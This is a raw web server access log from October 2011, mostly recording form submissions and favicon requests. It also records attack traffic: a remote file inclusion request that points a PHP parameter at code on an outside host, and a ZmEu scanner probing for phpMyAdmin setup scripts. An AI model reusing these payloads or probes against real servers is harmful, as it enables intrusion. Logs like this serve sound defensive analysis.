50.72.32.128 - - [09/Oct/2011:19:44:57 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
50.72.32.128 - - [09/Oct/2011:19:44:58 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
207.161.96.229 - - [09/Oct/2011:20:09:46 -0500] "POST /formreturn.php HTTP/1.1" 200 490 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
207.161.96.229 - - [09/Oct/2011:20:09:49 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
207.161.96.229 - - [09/Oct/2011:21:23:53 -0500] "POST /formreturn.php HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
207.161.96.229 - - [09/Oct/2011:21:23:58 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
209.190.5.50 - - [09/Oct/2011:22:02:32 -0500] "GET / HTTP/1.1" 200 454 "-" "Python-urllib/2.4"
50.71.130.163 - - [09/Oct/2011:23:02:22 -0500] "POST /formreturn.php HTTP/1.1" 200 452 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.83 Safari/535.2"
50.71.130.163 - - [09/Oct/2011:23:02:22 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.83 Safari/535.2"
208.80.194.29 - - [10/Oct/2011:01:49:43 -0500] "GET / HTTP/1.0" 200 454 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; EmbeddedWB 14,52 from: http://www.bsalsa.com/ EmbeddedWB 14.52; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)"
50.28.84.146 - - [10/Oct/2011:05:15:22 -0500] "GET /appserv/main.php?appserv_root=http://163.20.28.137/t.txt? HTTP/1.1" 404 469 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
195.190.166.41 - - [10/Oct/2011:09:32:15 -0500] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 489 "-" "ZmEu"
195.190.166.41 - - [10/Oct/2011:09:32:15 -0500] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 479 "-" "ZmEu"
195.190.166.41 - - [10/Oct/2011:09:32:15 -0500] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 478 "-" "ZmEu"
195.190.166.41 - - [10/Oct/2011:09:32:16 -0500] "GET /pma/scripts/setup.php HTTP/1.1" 404 474 "-" "ZmEu"
195.190.166.41 - - [10/Oct/2011:09:32:16 -0500] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 477 "-" "ZmEu"
195.190.166.41 - - [10/Oct/2011:09:32:16 -0500] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 478 "-" "ZmEu"
50.72.135.171 - - [10/Oct/2011:09:49:15 -0500] "POST /formreturn.php HTTP/1.1" 200 998 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
50.72.135.171 - - [10/Oct/2011:09:49:56 -0500] "POST /formreturn.php HTTP/1.1" 200 998 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
50.72.135.171 - - [10/Oct/2011:09:50:13 -0500] "POST /formreturn.php HTTP/1.1" 200 991 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
50.72.135.171 - - [10/Oct/2011:09:51:29 -0500] "POST /formreturn.php HTTP/1.1" 200 980 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
50.72.135.171 - - [10/Oct/2011:10:00:48 -0500] "POST /formreturn.php HTTP/1.1" 200 980 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
24.77.166.249 - - [10/Oct/2011:10:18:49 -0500] "POST /formreturn.php HTTP/1.1" 200 411 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
24.77.166.249 - - [10/Oct/2011:10:18:49 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
24.77.166.249 - - [10/Oct/2011:10:18:49 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
50.72.135.171 - - [10/Oct/2011:11:44:44 -0500] "POST /formreturn.php HTTP/1.1" 200 980 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
50.72.135.171 - - [10/Oct/2011:11:44:49 -0500] "POST /formreturn.php HTTP/1.1" 200 979 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
50.72.135.171 - - [10/Oct/2011:11:44:57 -0500] "POST /formreturn.php HTTP/1.1" 200 979 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
50.72.135.171 - - [10/Oct/2011:12:22:23 -0500] "POST /formreturn.php HTTP/1.1" 200 994 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
50.72.135.171 - - [10/Oct/2011:12:23:59 -0500] "POST /formreturn.php HTTP/1.1" 200 994 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
50.72.135.171 - - [10/Oct/2011:12:46:20 -0500] "POST /formreturn.php HTTP/1.1" 200 994 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
50.72.135.171 - - [10/Oct/2011:13:06:42 -0500] "POST /formreturn.php HTTP/1.1" 200 994 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
50.72.135.171 - - [10/Oct/2011:13:12:48 -0500] "POST /formreturn.php HTTP/1.1" 200 928 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
50.72.135.171 - - [10/Oct/2011:14:04:40 -0500] "POST /formreturn.php HTTP/1.1" 200 439 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
